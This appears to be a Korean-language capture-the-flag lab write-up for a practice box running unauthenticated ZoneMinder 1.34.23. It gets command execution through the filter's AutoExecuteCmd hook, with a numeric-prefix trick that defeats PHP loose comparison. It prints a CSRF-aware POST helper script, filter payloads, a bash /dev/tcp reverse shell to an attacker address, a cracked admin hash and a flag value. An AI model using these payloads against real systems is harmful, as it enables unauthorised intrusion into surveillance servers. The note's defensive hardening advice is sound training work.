---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/unsolved
  - tech/web/auth-bypass
  - tech/web/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
status: unsolved
manual_tags: true
manual_cves: true
---
> [!info] 상단 요약
> 타겟 192.168.248.214 · Linux (Debian) · Fundamental · **부분 1/2 (user 확보, root 미확보)**
> 경로: 80 Apache 2.4.53 → `/zm-prod/` 에 **ZoneMinder 1.34.23** 가 `OPT_USE_AUTH` 꺼진 채 노출(무인증 admin 콘솔) → Monitor 하나를 만들어 Event 를 생성 → **Filter `AutoExecuteCmd` → `zmfilter.pl` 의 `qx()`** 로 명령 실행 → **숫자 접두(`9;`) 로 PHP7 느슨비교 타입저글링을 우회** → 리버스셸(www-data, **아웃바운드 tcp/80**) → `/home/isaac/local.txt`.
> **root 는 못 얻었다.** 4장에 배제 목록과 남은 lead 를 남긴다.

이 박스는 **초기 침투에 한 번 실패했다가**(로그인 폼만 파고 웹앱을 통째로 놓쳤다) 웹 취약점 재검토에서 뚫렸다. 그 실패 서사가 6장 세 번째 함정의 실체다.

## 0. 이 박스에서 배우는 것

- **ZoneMinder 무인증 인식** — `OPT_USE_AUTH` 가 꺼져 있으면 `?view=console`·`?view=options` 가 로그인 없이 200. `/zm/` 이 표준 경로지만 여기선 `/zm-prod/` 로 옮겨져 있었다.
- **Filter `AutoExecuteCmd` = 명령 실행 sink.** ZoneMinder 의 이벤트 필터는 매칭 이벤트마다 사용자가 넣은 명령을 `qx()`(백틱) 로 돌린다. 정상 기능이지만 무인증이면 그대로 RCE.
- **PHP 7 느슨비교 타입저글링이 명령을 조용히 삼키는 함정** — 기본값 정수 `0` 과 `!=` 비교에서 비숫자 문자열이 `0` 으로 캐스팅돼 "변경 없음"으로 버려진다. **숫자로 시작하는 페이로드만 저장된다.**
- **자동 도구가 못 찾은 경로가 로그에 유출돼 있을 수 있다** — `/server-status` 에 `GET /zm-prod/` 가 찍혀 있었는데 1차 열거에서 "미끼 소음"으로 치부했다.
- **아웃바운드 포트는 계층별로 확인** — 443·ICMP·53 막힘, 80 열림. 백그라운드(`setsid … &`) 페이로드가 실패를 은폐한다.
- **시험 출제 가능성**: ZoneMinder 는 PG 에 반복 출제된다([[Pebbles]] 는 1.29.0 SQLi). "무인증 CCTV/감시 웹앱 + `?view=` 라우팅" 을 보면 곧바로 버전·인증 상태부터 확인하는 반사가 전이된다. 명령 실행 필터/스크립트 훅이 있는 관리 웹앱(ZoneMinder·Cacti·Nagios·LibreNMS 류) 전반에 같은 접근이 통한다.

## 1. 정찰

### Nmap

```
# Nmap 7.98 scan initiated Fri Aug 21 04:41:33 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.214
Nmap scan report for 192.168.248.214
Host is up (0.085s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.53
|_http-title: Cobbles
|_http-server-header: Apache/2.4.53 (Debian)
```
출처: `~/PG/Cobbles/nmap.log`

`-p-` 를 **두 번**(fast `--min-rate 5000`, careful `--min-rate 800 --max-retries 3`) 돌려 외부 오픈 포트가 **22/80 뿐**임을 확정했다. 나머지 65533은 전부 filtered. UDP top-100 은 전부 `open|filtered`(무응답), SNMP(onesixtyone 120 커뮤니티 + snmpwalk public/private/community/manager/cobbles) 무응답 — UDP·SNMP 는 진입점이 아니다.

`Service Info: Host: 127.0.0.1` 가 눈에 띈다. 80 은 실제로 로컬 백엔드로 도는 리버스 프록시였다(아래).

### 웹 표면

`/` 는 `Cobbles` 라는 로그인 폼(`index.php`, POST username/password)이다. 응답 헤더에 `x-backend-server: primary`, Set-Cookie 없음. `/server-status`(mod_status) 가 열려 있어 백엔드 VHost 가 `127.0.0.1:8080` 임이 드러난다 — 즉 80 Apache 는 8080 백엔드로의 프록시다.

**여기서 1차 열거와 재검토가 갈렸다.** `/server-status` 스코어보드에는 내부 디렉터리 스캐너의 버스트가 계속 찍혔고, 그 안에 **`GET /zm-prod/ HTTP/1.0`** 이 섞여 있었다(`burst.txt` 에 105회, `burst_uniq.txt` 에 유니크로 남음). 1차 열거에서는 이 스캐너 트래픽을 통째로 "로그를 채우는 미끼 소음" 으로 판단하고 버렸다. 재검토에서는 그 로그 줄을 **경로 힌트**로 읽었다 — 이게 진입의 전부다(6장 함정 3).

디렉터리 브루트(feroxbuster: common / directory-list-2.3-medium ~220k×php,txt,html,bak / raft-large-directories)는 `index.php` `style.css` `favicon.png` `server-status` 밖에 못 찾았다. **워드리스트에 `zm-prod` 가 없었기 때문**이다. 자동 열거가 0을 뱉어도 앱이 없는 게 아니라, 워드리스트에 그 이름이 없을 뿐이었다.

## 2. 취약점 분석

### 배경 — ZoneMinder 와 무인증

ZoneMinder 는 리눅스용 오픈소스 CCTV/영상감시 소프트웨어다. PHP 프론트엔드 + MySQL(`zm` DB) + Perl/C++ 데몬. 웹 진입점은 `index.php` 하나고 `?view=` 로 화면(console·options·filter·monitor·log…)을 라우팅한다.

`OPT_USE_AUTH` 옵션이 꺼져 있으면 모든 view 가 로그인 없이 열린다. 이 인스턴스가 그랬다:

- `GET /zm-prod/` = 200, `ZMSESSID` 세팅, 타이틀 `ZM - Console`.
- `?view=version` → `v1.34.23` (아래 스크린샷).
- `?view=console`·`?view=options&tab=system` 전부 로그인 없이 200. = **전체 admin 콘솔이 무인증**.

![[PG-Cobbles-zm-version.png]]

버전은 화면이 스스로 밝힌다 — "You are running the most recent version of ZoneMinder, v1.34.23." 이 값으로 `~/PG/Cobbles/zm-src` 에 소스를 태그 1.34.23 로 클론해 취약점 근거를 댔다.

### RCE sink — Filter `AutoExecuteCmd` → `zmfilter.pl` 의 `qx()`

ZoneMinder 의 이벤트 필터는 "이런 조건의 이벤트가 생기면 이 명령을 실행" 을 설정할 수 있다(`AutoExecute` + `AutoExecuteCmd`). 실행 주체는 `zmfilter.pl`:

```perl
sub executeCommand {
  my $filter = shift;
  my $Event = shift;
  my $event_path = $Event->Path();
  my $command = $filter->{AutoExecuteCmd};
  $command .= " $event_path";
  $command = substituteTags($command, $filter, $Event);
  Info("Executing '$command'");
  my $output = qx($command);
```
출처: `zm-src/scripts/zmfilter.pl.in:998-1011`

`qx()`(백틱)는 셸을 거쳐 실행된다. `AutoExecuteCmd` 는 사용자가 필터 저장 폼에 넣는 값이므로, **무인증으로 필터를 만들 수 있으면 그대로 명령 실행**이다. 이벤트 하나당 한 번 실행된다는 점만 유의하면 된다(그래서 Foothold 에서 Monitor 를 먼저 만든다).

`Info("Executing '$command'")` 이 줄이 뒤에서 진단의 결정타가 된다.

### 왜 첫 시도가 조용히 실패했나 — 정수 `0` 과의 느슨비교 (재현의 핵심)

필터 저장은 `AutoExecuteCmd` 의 기본값이 **정수 `0`** 이다:

```php
protected $defaults = array(
  ...
  'AutoExecute'     =>  0,
  'AutoExecuteCmd'  =>  0,
```
출처: `zm-src/web/includes/Filter.php:8-12`

저장 시 어떤 필드가 "바뀌었는지" 는 `changes()` 가 판정하는데, 스칼라 필드는 이렇게 비교한다:

```php
if ( $this->{$field} != $value ) {
  $changes[$field] = $value;
}
```
출처: `zm-src/web/includes/Object.php:247` (스칼라 분기)

여기서 `$this->{'AutoExecuteCmd'}` 는 기본값 정수 `0`, `$value` 는 우리가 보낸 명령 문자열이다. 타겟은 Debian bullseye 의 **PHP 7.4** 이고, PHP 7 에서 `int == string` 비교는 문자열을 숫자로 캐스팅한다:

- `0 != "id > /tmp/x"` → 비숫자 문자열은 `(int)0` 으로 캐스팅 → `0 != 0` = **false** → 변경으로 안 잡힘 → `AutoExecuteCmd` 는 기본값 `0` 그대로 저장된다.
- 그러면 `zmfilter.pl` 은 `qx("0 /event/path")` 를 돌리고 — 셸에는 `0` 이라는 명령이 없다. 로그에 **`Executing '0 /path/to/event'`** 가 남는다. 명령이 통째로 버려진 것이다.

재검토에서 무인증 로그 뷰의 이 `Executing '0 …'` 를 관측한 게 결정타였다. 저장값이 `0` 으로 남았다는 것은 위 캐스팅으로만 설명된다. **앞선 두 번의 리버스셸 시도가 아무 에러 없이 실패한 이유가 이것**이었다 — 페이로드가 `setsid`·`bash` 처럼 비숫자로 시작해 전부 삼켜졌다.

우회는 간단하다. **명령 앞에 `9;`(또는 `1;`) 를 붙여 nonzero 로 캐스팅**시킨다:

- `0 != "9;bash …"` → `"9;bash …"` 은 앞자리가 `9` 인 leading-numeric → `(int)9` → `0 != 9` = **true** → 변경으로 잡혀 저장된다.
- `qx("9;bash … /event/path")` → `9` 는 command-not-found 로 무해하게 죽고, `;` 뒤가 실행된다.

즉 `9;` 는 셸 인젝션 우회가 아니라 **PHP 쪽 "변경 감지" 를 통과시키는 타입저글링 우회**다. 자동 도구로는 절대 안 나온다 — 저장 폼이 200을 주고도 값이 조용히 사라지는 것을 로그로만 알 수 있다.

## 3. Foothold

### (a) Event 를 만들 Monitor 생성

필터는 **매칭되는 이벤트마다** 명령을 돌린다. 초기 상태는 Monitor 0개·Event 0개라 필터를 실행해도 반복할 대상이 없다. 그래서 먼저 Monitor 를 하나 만들어 이벤트를 계속 생성시킨다. `Function=Mocord`(연속 녹화), 소스는 로컬 웹의 `cobbles.jpg` 를 프레임으로 당겨오게 했다:

```
view=monitor
action=monitor
mid=0
newMonitor[Name]=pwn
newMonitor[Type]=Remote
newMonitor[Function]=Mocord
newMonitor[Protocol]=http
newMonitor[Method]=simple
newMonitor[Host]=127.0.0.1
newMonitor[Port]=80
newMonitor[Path]=/cobbles.jpg
...
```
출처: `~/PG/Cobbles/mon.data` (전체 필드 포함)

콘솔에 `pwn` Monitor 가 `Mocord`/`Capturing` 으로 뜨고 이벤트 카운터가 올라간다. 아래 스크린샷은 무인증 콘솔 + 만들어진 Monitor + 이벤트 107건이 한 화면에 담긴 것 — 진입·이벤트생성·필터 대상이 전부 여기 있다:

![[PG-Cobbles-zm-console.png]]

### (b) CSRF 토큰을 물고 필터 실행

ZoneMinder 는 `csrf-magic` 을 쓴다. **먼저 페이지를 GET 해 `ZMSESSID` 쿠키와 `key:HEX,TS` 토큰을 받고, 같은 쿠키 병으로 POST** 해야 한다. 헬퍼(`zm_post.sh`)가 그 일을 한다:

```bash
#!/bin/bash
T=192.168.248.214; BASE="http://$T/zm-prod"; CJ=$(mktemp)
BODY=$(curl -s -c "$CJ" "$BASE/index.php?view=console")
TOKEN=$(echo "$BODY" | grep -oE "key:[a-f0-9]{40},[0-9]+" | head -1)
ARGS=(--data-urlencode "__csrf_magic=$TOKEN")
while IFS= read -r line; do
  [ -z "$line" ] && continue
  ARGS+=(--data-urlencode "$line")
done < "$1"
curl -s -b "$CJ" -c "$CJ" -i "$BASE/index.php" "${ARGS[@]}"
rm -f "$CJ"
```
출처: `~/PG/Cobbles/zm_post.sh`

먼저 `id` 로 명령 실행 자체를 검증했다(출력을 웹에서 읽을 수 있는 캐시 경로로 리다이렉트):

```
view=filter
object=filter
action=execute
Id=
filter[Query][terms][0][attr]=MonitorId
filter[Query][terms][0][op]==
filter[Query][terms][0][val]=1
filter[AutoExecute]=1
filter[AutoExecuteCmd]=1;id>/var/cache/zoneminder/cache/o.txt 2>&1;#
```
출처: `~/PG/Cobbles/rce.data` (숫자 접두 `1;`)

`filter[Query][terms][0]` = MonitorId==1(=pwn) 로, 방금 만든 모니터의 이벤트에만 매칭시킨다. 접두 `1;` 덕에 값이 저장되고, `qx` 가 `id` 를 실행해 `o.txt` 에 www-data 신원이 찍힌다.

### (c) 리버스셸

명령 실행이 확인되자 리버스셸로 승격. **아웃바운드는 443·ICMP·53 이 막혀 있고 80 만 열려 있었다**(6장 함정 2). 그래서 LHOST 를 tcp/80 으로:

```
filter[AutoExecute]=1
filter[AutoExecuteCmd]=9;bash -c "exec 3<>/dev/tcp/192.168.45.207/80&&setsid bash -i <&3 >&3 2>&3 &"
```
출처: `~/PG/Cobbles/rsh80.data` (숫자 접두 `9;`)

Kali 에서 `nc -lnvp 80`(tmux) 으로 받았다. www-data 대화형 셸이 붙었다.

⚠️ **수동 대안 / 재현 메모**: 리스너는 반드시 tmux 안에서 띄운다(비대화형 ssh 는 호출 종료 시 자식을 죽인다). 페이로드에 `9;`(또는 `1;`) 접두를 빠뜨리면 필터 저장이 200을 주고도 값이 사라져 아무 일도 안 일어난다 — 이게 이 박스의 유일한 트릭이다.

### 플래그

www-data 셸에서 user 플래그를 원위치 `cat` 했다. `/home/isaac/local.txt`, `-rw-r--r--`(world-readable) 라 www-data 로 읽힌다.

```
f03187be28c3a436d9725bcfd23cb1f6
```
출처: `~/PG/Cobbles/proof_user.txt` · **2026-08-21 인스턴스**

> [!warning] 증거 형식 — 한 화면 캡처는 유실
> 값은 대화형 리버스셸(www-data)에서 실측했으나, `whoami; id; hostname; ip a; cat local.txt` 를 **한 화면에 담은 캡처를 세션 종료 전에 남기지 못했다.** `proof_user.txt` 에는 33바이트 값만 있다. 시험 규정상 플래그는 신원과 한 화면에 찍어야 인정되므로, **재현 시 반드시 `id;hostname;cat /home/isaac/local.txt` 를 한 번에 찍어 둘 것.** (파일이 world-readable 이라 웹셸로도 읽히지만, 대화형 셸에서 원위치 `cat` 했으므로 웹셸 0점 문제에는 해당하지 않는다.)

## 4. 권한상승 — 미확보 (root 못 얻음)

셸을 잡자마자 표준 열거를 훑고 아래를 **배제**했다. 배제 목록 자체가 다음 사람의 지도다:

- `sudo -l` — sudo 바이너리 없음(설치 안 됨).
- `find / -perm -4000` — SUID 표준 세트만(권한상승 후보 없음).
- `getcap -r /` — 특이 capability 없음.
- `/etc/crontab`·`/etc/cron.*`·systemd timer — 표준.
- MySQL(`zm` DB) — `secure_file_priv=NULL` 아님(= `INTO OUTFILE` 로 파일쓰기 불가).
- `docker.sock` — www-data 가 docker 그룹 아님.
- admin bcrypt 크랙됨(아래) 이나 **SSH·su 로 재사용 안 됨**.

ZoneMinder Users 테이블의 admin 해시를 뽑아 크랙했다:

```
$2b$12$NHZsm6AM2f2LQVROriz79ul3D6DnmFiZC.ZK5eqbF.ZWfwH9bqUJ6
```
출처: `~/PG/Cobbles/admin.hash` → 평문 **`admin`**(admin:admin).

그런데 이 크레덴셜은 **셸 획득에 기여하지 않았다** — 애초에 `OPT_USE_AUTH` 가 꺼져 무인증이었고, `admin:admin` 을 SSH(`isaac`/`root`/`sam`)·`su` 어디에도 재사용할 수 없었다. 그래서 태그에는 default-creds 를 달지 않았다(설명만 하고 쓰지 않은 기법).

**남은 lead 둘 (둘 다 「시도하지 않음」·`[가정]`):**

1. `[가정]` **logrotate postrotate 훅** — `/etc/logrotate.d/zoneminder` 가 회전 후 `/usr/bin/zmpkg.pl` 류를 root 로 실행하고, `/var/log/zm/*` 가 www-data 쓰기 가능이라면 회전 시점에 권한상승 여지가 있다. 다만 zoneminder logrotate 는 대개 **weekly** 라 시험 시간 안에 트리거하기 어렵다(강제 회전은 root 권한이 필요). 실제 훅 내용·주기는 이 박스에서 확인하지 못했다.
2. `[가정]` **커널 익스플로잇** — `uname -r` 5.10.0-15(Debian bullseye). 후보는 있으나 공유 랩에서 커널 익스는 리스크가 커 승인 없이 시도하지 않았다.

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| user | `/home/isaac/local.txt` | `f03187be28c3a436d9725bcfd23cb1f6` (2026-08-21 인스턴스) |
| root | — | **미확보** |

## 6. 막혔던 지점 / 시행착오 ← 이 노트의 핵심

### 함정 1 — 필터가 "먹은 것처럼 보이나 안 먹은" 타입저글링 드롭

리버스셸 필터를 두 번 실행했는데(`setsid …`/`bash …` 로 시작하는 페이로드) 저장 폼은 200을 주고, 필터도 "실행됨" 으로 이벤트를 소진하는데, **아무 콜백도 아무 에러도 없었다.** 처음엔 아웃바운드 방화벽을 의심했다.

실체는 2장에 소스로 댄 그대로다: `AutoExecuteCmd` 기본값이 정수 `0` 이고 `changes()` 가 `0 != $value` 로 비교하는데, PHP 7.4 가 **비숫자 명령 문자열을 `(int)0` 으로 캐스팅** → `0 != 0` = false → "변경 없음" 으로 값이 버려지고 기본값 `0` 이 저장된다. 그러면 `qx("0 /event/path")` 가 돌아 로그에 `Executing '0 …'` 가 남는다. 무인증 로그 뷰에서 그 `0` 을 본 게 결정타였다.

**해결**: 명령 앞에 `9;`(또는 `1;`) 를 붙여 leading-numeric 로 만들어 `0 != 9` = true 를 성립시키니 즉시 값이 저장되고 셸이 붙었다. 앞선 두 시도가 조용히 실패한 이유가 정확히 이 캐스팅이었다.

교훈: **저장 폼이 200을 준다고 값이 저장된 게 아니다.** 명령 실행형 기능에서 콜백이 없으면, 방화벽을 의심하기 전에 **앱 자신의 로그로 "무엇이 실제로 실행됐는지"** 를 먼저 확인한다. 여기선 로그가 저장 실패를 직접 뱉었다.

### 함정 2 — 아웃바운드 443 차단, 80 열림 + 백그라운드가 실패를 은폐

초기 리버스셸은 443 으로 쐈다(`sh.data`·`sh2.data`, 둘 다 `setsid … &` 백그라운드). 함정 1 때문에 애초에 실행조차 안 됐지만, **백그라운드(`&`)로 던져서 로컬 실행 실패도 눈에 안 보였다** — "이벤트만 소진되고 조용" 한 상태가 됐다. 이 때문에 "실행 실패" 인지 "egress 차단" 인지 분리가 안 됐다.

전환: **출력을 캡처하는 비백그라운드 페이로드**(`1;id>/var/cache/zoneminder/cache/o.txt 2>&1`) 로 바꾸니 명령 실행 자체는 검증됐다. 이어 egress 를 계층별로 때려봤다:

- `probe.data`(`ping -c2` + `curl http://LHOST/H80` + `curl http://LHOST:53/H53`) 실행 후 Kali `tcpdump` 관측: `try1_icmp.log`·`try2_oob.log` 모두 **0 packets captured** — ICMP 와 53 은 나오지 않았다.
- 최종 리버스셸은 **tcp/80 으로 성립**(`rsh80.data`, `NOTES_final.txt`: "egress tcp/80").

즉 **443·ICMP·53 막힘, 80 열림**. `setsid … &` 백그라운드 페이로드는 로컬 실패든 egress 실패든 똑같이 "조용" 해서 오진을 유발한다 — 진단 단계에서는 **전경(foreground)·출력캡처형**으로 먼저 실행을 확정하고, 그 다음 포트를 바꿔가며(443→80→53) egress 를 좁힌다.

> [!warning] 원격 방화벽 오독 주의
> 이 박스의 raw `egress*.log` 에 찍힌 `192.168.248.214.80 > 192.168.45.207.xxxxx` 패킷들은 **connect-back 이 아니라 내 curl 요청에 대한 타겟 Apache 의 응답**(source port 80)이다. connect-back 증거는 `try*_.log` 의 0-packet 캡처와 최종 80 셸 성립이다. tcpdump 원문을 connect-back 으로 오독하지 말 것.

### 함정 3 — 웹앱을 통째로 놓쳤다 (진입점이 로그에 있었다)

이 박스는 **먼저 실패했다.** 초기 침투 시도에서는 로그인 폼(`index.php`)만 실질 표면으로 보고 2.5시간을 태웠다:

- **비밀번호 브루트** — hydra→ffuf(100스레드) rockyou 로 웹 로그인을 때려 **2.13M/14.3M 시도, 히트 0**. (유저 열거로 `sam` 하나는 확인됨: `Invalid username!` vs `Invalid password!`.)
- **리버스프록시 헤더 미끼** — `x-backend-server: primary` 를 "primary 가 있으면 secondary 가 있다" 로 읽고 300+ 요청으로 secondary 백엔드를 찾아 헤맴. 완전 정적 헤더였다.
- **request smuggling / traversal** — CVE-2023-25690, CVE-2021-41773/42013 전부 부정(순수 ProxyPass, 패치됨).

**이 셋은 전부 진짜 앱(`/zm-prod/`)에 도달조차 못 한 상태에서 벌인 것**이었다. 그런데 진입점은 처음부터 로그에 있었다 — `/server-status` 스코어보드의 내부 스캐너 버스트에 **`GET /zm-prod/ HTTP/1.0`** 이 105회 찍혀 있었고(`burst.txt`), 그때는 스캐너 트래픽 전체를 "미끼 소음" 으로 치웠다.

교훈: **자동 도구(feroxbuster)가 못 찾은 경로가 로그에 노출돼 있을 수 있다.** 워드리스트에 `zm-prod` 가 없으면 dirbust 는 영원히 0을 준다. `/server-status`·access 로그·referrer 같은 데 남은 경로 문자열을 **눈으로 읽는 것**이, 브루트를 한 시간 더 돌리는 것보다 낫다. "미끼 소음" 판정을 내리기 전에 그 소음이 참조하는 경로를 한 번은 직접 쳐 봐라.

### 부수 — CVE-2023-26035 (snapshot RCE) 불발

ZoneMinder 1.34.x 하면 CVE-2023-26035(`?view=snapshot` 미인증 RCE, msf `zoneminder_snapshots`)가 먼저 떠오른다. **1.34.23 에는 snapshot 뷰가 없어 불발**이다 — `views/` 에 `snapshot.php` 가 없고, `POST view=snapshot` 은 Content-Length 0 을 준다(존재하지 않는 뷰라 실행 자체가 안 됨). 초기 443 리버스셸 시도가 하필 이 **존재하지 않는 snapshot 뷰**를 향해 나가서 아무것도 실행되지 않았고, 그래서 한동안 "egress 차단" 으로 오진했다. 실제 sink 는 위의 Filter `AutoExecuteCmd` 였다.

## 7. OSCP 시험 관점

1. **무인증 감시/관리 웹앱을 보면 버전·인증 상태부터.** ZoneMinder·Cacti·Nagios·LibreNMS 류는 "매칭 이벤트에 명령 실행" 같은 스크립트 훅을 정상 기능으로 갖는다. 무인증이면 그 훅 = RCE.
2. **저장 폼 200 ≠ 저장 성공.** 명령 실행형 기능에서 콜백이 없으면 방화벽을 의심하기 전에 앱 로그로 "실제 실행된 명령" 을 확인하라. 여기선 정수 기본값과의 느슨비교가 값을 삼켰고, 로그의 `Executing '0 …'` 가 정답을 알려줬다.
3. **자동 도구 0 = 앱 부재 아님.** dirbust 가 아무것도 못 찾으면 워드리스트에 그 이름이 없을 뿐일 수 있다. `/server-status`·로그·헤더에 남은 경로를 눈으로 읽어라. 여기서 2.5시간을 잃었다.
4. **아웃바운드는 계층별로.** 443·ICMP·53 막히고 80만 열리는 구성이 흔하다. 진단은 전경·출력캡처형으로 실행부터 확정하고, 포트를 443→80→53 로 바꿔가며 좁힌다. `setsid … &` 백그라운드는 실패를 은폐하니 진단 단계에서 쓰지 마라.
5. **손절**: 유저 열거가 된다고 브루트 박스가 아니다. rockyou 앞 수만 개에 안 나오면(여기선 2.1M 무히트) 그 시점이 방향 전환점이다.

## 8. 방어 관점

- **ZoneMinder 에 `OPT_USE_AUTH` 를 켜라.** 관리 콘솔이 무인증으로 열려 있으면 필터 명령 실행·모니터 생성이 그대로 원격 코드 실행이다. 인증만 켰어도 이 박스는 안 뚫린다.
- 감시 웹앱을 인터넷/랩 세그먼트에 그대로 노출하지 말고 리버스 프록시 뒤 인증(basic-auth·VPN) 으로 감싼다.
- `/server-status`(mod_status) 를 공개하지 마라 — 내부 경로·백엔드가 유출된다(`/zm-prod/` 가 여기서 샜다).
- 명령 실행 훅이 필요하면 셸(`qx`/백틱) 대신 인자 배열 실행으로, 그리고 실행 계정을 최소권한으로 격리한다.

## 9. 참고 자료

- ZoneMinder 소스 1.34.23 — `~/PG/Cobbles/zm-src` (근거: `web/includes/Filter.php`, `web/includes/Object.php`, `scripts/zmfilter.pl.in`)
- CVE-2023-26035 — ZoneMinder snapshot 미인증 RCE. **이 박스엔 미적용**(1.34.23 에 snapshot 뷰 없음). 반증용 언급이라 `cves` 에 넣지 않음.
- 자매 박스 [[Pebbles]] — ZoneMinder 1.29.0, 같은 `OPT_USE_AUTH` off 진입, 다만 RCE 경로는 `limit` 파라미터 pre-auth SQLi.

## 남긴 흔적 / 관련 노트

- **셸 획득 후 정리**: `pwn` Monitor 와 실행한 Filter 는 ZoneMinder DB 에 남아 있을 수 있다(무인증 콘솔에서 삭제 가능). 업로드 파일: `/var/cache/zoneminder/cache/o.txt`(id 출력). tmux 세션·리스너는 종료.
  - ⚠️ `~/PG/Cobbles/traces_confirmed.log` 는 **초기 침투 단계(05:51)에 쓰인 것으로 "셸 미획득" 이라 적혀 있으나, 이후 재검토에서 셸을 얻었다** — 그 파일은 최종 상태가 아니다.
- **타겟 로그**: access.log 에 초기 침투 단계의 웹 브루트 ~2.1M, auth.log 에 sam SSH 실패 ~700 — 셸 없던 시점이라 정리 불가.
- Kali `~/PG/Cobbles/` 산출물 보존: `nmap.log`, `zm-src/`, `mon.data`·`rce.data`·`rsh80.data` 등 필터 페이로드, `zm_post.sh`/`zm_rce.sh` 헬퍼, `admin.hash`, `egress*.log`·`try*.log`, `burst*.txt`, `NOTES_final.txt`·`WEB_ENTRY_FINDING.txt`·`writeup_notes.txt`, 스크린샷.
- 스크린샷: `![[PG-Cobbles-zm-version.png]]`(버전) · `![[PG-Cobbles-zm-console.png]]`(무인증 콘솔+pwn Monitor). 초기 열거 때 찍은 `PG-Cobbles-login.png`·`PG-Cobbles-serverstatus.png` 도 `파일보관\` 에 보존(로그 대체 가능이라 본문 미첨부).
- 유사 표면 [[Pebbles]] · [[_STATUS]]
